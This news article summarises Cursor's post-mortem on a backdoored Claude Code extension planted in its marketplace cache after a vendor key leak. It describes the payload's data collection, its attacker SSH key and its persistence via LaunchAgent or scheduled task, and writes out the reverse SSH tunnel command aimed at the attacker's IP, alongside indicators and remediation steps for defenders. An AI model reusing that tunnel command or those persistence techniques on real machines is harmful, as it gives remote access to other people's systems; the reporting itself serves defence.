---
title: "Cursor Post-Mortem: A Fireworks-Exposed Key Led to a Trojanized Claude Code Extension in Cursor's Marketplace"
subtitle: "An access key Cursor gave its inference vendor was exposed. The attacker used it to read old agent traces, found unredacted credentials in them, and eventually planted a backdoored Anthropic.claude-code 2.1.312/2.1.313 in the marketplace cache for about 11 hours."
pubDate: 2026-11-16
category: "security"
tags: ["Cursor", "Supply Chain", "VS Code Extensions", "Claude Code", "Fireworks AI", "Credential Leak", "Incident Response"]
readingTime: "5 min read"
author:
  name: "Mazzden"
  role: "Editor-in-Chief, TechPulse"
featured: false
severity: "HIGH"
affectedVersions: "Anthropic.claude-code 2.1.312 and 2.1.313 for macOS and Windows, installed from the Cursor VS Code extension marketplace on October 29, 2026 between about 2:27am and 1:35pm PT"
patchedVersions: "Malicious builds removed; marketplace rebuilt. Open VSX and Anthropic's own distribution were never affected"
coverImage: "/images/covers/cursor-marketplace-trojanized-claude-code-extension-fireworks-key-postmortem.webp"
coverAlt: "Ink-and-wash illustration of two shelves of identical muted boxes, one terracotta box on the lower shelf trailing a thin ink line out to a small dark dot in the corner, and a small ochre key lying on the floor at the far left"
coverCaption: "Illustration by TechPulse Editorial · The box looked like all the others. The key had been lost long before."
tldr:
  - "Cursor's November 13 post-mortem says the attack started at Fireworks AI, which exposed an access key Cursor had issued to it. The key gave read access to a bucket of coding-agent traces, mostly from 2025, taken from sessions without Privacy Mode."
  - "Some traces contained credentials that hadn't been redacted (fewer than 0.01% of customers had API credentials exposed). The attacker used them to get into Cursor's SaaS tools, archived non-production repos, support data, and credentials users had sent to support."
  - "On October 29 the attacker used one of those credentials to put backdoored copies of Anthropic.claude-code 2.1.312 and 2.1.313 into the cache behind Cursor's VS Code marketplace. Up to 5,000 users may have received them during the roughly 11 hours they were available. The payload added an svc-telemetry SSH key, installed persistence, and tried to open a reverse SSH tunnel."
  - "If you got those versions from Cursor's marketplace, run Cursor's check and remediation scripts. Uninstalling the extension isn't enough. Remove the svc-telemetry key and the LaunchAgent or SysMon scheduled task, and rotate credentials from a clean machine. Cursor says the incident is contained, with no attacker activity since November 1."
sources:
  - label: "Cursor — An update on our recent security incident (Nov 13, 2026)"
    url: "https://cursor.com/blog/security-incident-update"
  - label: "Cursor — Security notice: malicious Anthropic.claude-code 2.1.312 and 2.1.313 (IOCs and scripts)"
    url: "https://cursor.com/blog/claude-code-extension-security-notice"
  - label: "The Hacker News — Stolen Fireworks AI key led to Cursor's trojanized Claude Code extension"
    url: "https://thehackernews.com/2026/11/stolen-fireworks-ai-key-led-to-cursor.html"
  - label: "BleepingComputer — Cursor confirms security breach led to malicious Claude Code extension"
    url: "https://www.bleepingcomputer.com/news/security/cursor-confirms-security-breach-led-to-malicious-claude-code-extension/"
  - label: "SANS ISC Stormcast — Monday, November 16th, 2026"
    url: "https://isc.sans.edu/podcastdetail/5941"
---

On October 29, a backdoored copy of **Anthropic's Claude Code extension** turned up in Cursor's VS Code extension marketplace. On November 13, after two weeks of investigation, Cursor published how it happened. The bug wasn't in Cursor's editor, and it wasn't in Anthropic's extension. The attack started with **an access key Cursor had given to a vendor**, and it spread through **credentials sitting unredacted in old coding-agent traces**.

## The chain, step by step

1. **A vendor exposed the key.** Cursor had given an access key to **Fireworks AI**, its training and inference partner. Fireworks exposed it. The attacker used it to copy a read-only bucket of **coding-agent traces**, mostly from 2025, from sessions where **Privacy Mode was off** and Cursor was allowed to use the data for training. ([Railway's earlier post-mortem](/articles/railway-postmortem-build-isolation-escape-ai-key-theft) had already listed Fireworks among the companies reporting similar thefts in October.)
2. **The traces contained secrets.** A small number of traces had **credentials that were never redacted**. Cursor says fewer than 0.01% of customers had API credentials exposed this way, and fewer than 0.05% of non-Privacy-Mode users had any traces exposed.
3. **From there into Cursor's tools.** Using those credentials, the attacker reached some of Cursor's **SaaS tools**, archived **non-production source repositories**, customer-support data and email, usage metrics, summaries of some agent conversations, and **credentials users had sent to Cursor's support team**.
4. **Cursor rotated keys, but missed one.** Monitoring caught the activity. Cursor revoked keys and temporarily shut down services, but **one stolen internal credential was still valid**. The attacker used it to put malicious copies of `Anthropic.claude-code` **2.1.312 and 2.1.313** for macOS and Windows straight into the **cache that serves the marketplace**. The upstream source, Open VSX, never had the malware.
5. **About 11 hours of exposure.** The builds were available from about 2:27am to 1:35pm PT. **At most 5,000 users** requested those cached versions. Cursor took the marketplace offline, rebuilt it, and checked that every other extension was authentic.

Cursor says production systems, the Cursor app and its signed updates, release signing keys, customer repositories, live inference traffic and Privacy Mode data were **not** affected. The company has moved all inference off Fireworks, rotated every internal credential, added secret scanning and redeployed its production infrastructure. The last attacker activity it saw was on **November 1**, and that attempt was blocked.

## What the payload did

According to Cursor's October 29 notice, the trojanized `extension.js`:

- Sent the attacker the hostname, username, OS, home directory, **environment variable names**, Git email and public IP.
- Added an attacker SSH key with the comment **`svc-telemetry`** to `authorized_keys` and tried to turn on the local SSH server. That step usually failed without admin rights.
- Tried to open a reverse tunnel (`ssh -N -R '*:0:localhost:22'` to `134[.]209[.]82[.]225`) and kept retrying about every 60 seconds through a **LaunchAgent** on macOS or a **`SysMon` scheduled task** on Windows.

The attacker's server has since been taken down. Cursor still says plainly that **uninstalling the extension alone may not remove the persistence**.

## What to do if you use Cursor

1. **Check whether you're affected.** Look in your extensions folder for `Anthropic.claude-code` 2.1.312 or 2.1.313, and search `extension.js` for `134.209.82.225` or `svc-telemetry`. Cursor's notice includes a check script and remediation scripts for macOS and Windows.
2. **Remove the persistence.** Delete the `svc-telemetry` line from `~/.ssh/authorized_keys`, delete the LaunchAgent or the `SysMon` task and Startup script, kill any `ssh`/`autossh` processes with `-R` flags, and turn remote login back off if you never used it.
3. **Rotate from a clean machine.** The payload saw environment variable names, so rotate any secrets those variables held. Isolate or rebuild hosts that show signs the payload ran.
4. **If Cursor emailed you about exposed keys**, revoke them at the issuing service, not only in Cursor.

## The lesson for every AI dev-tool team

This is the second post-mortem in a month, after Railway's, where **AI training and inference data turned into a credential leak**. Agent traces capture whatever the agent saw: `.env` files, tokens in shell output, keys pasted into chat. If those traces go to a vendor, then that vendor's access keys protect your customers' secrets. Redact before you store traces, limit vendor keys to known networks (Cursor has now done this), and treat a trace bucket as sensitively as a secrets vault.
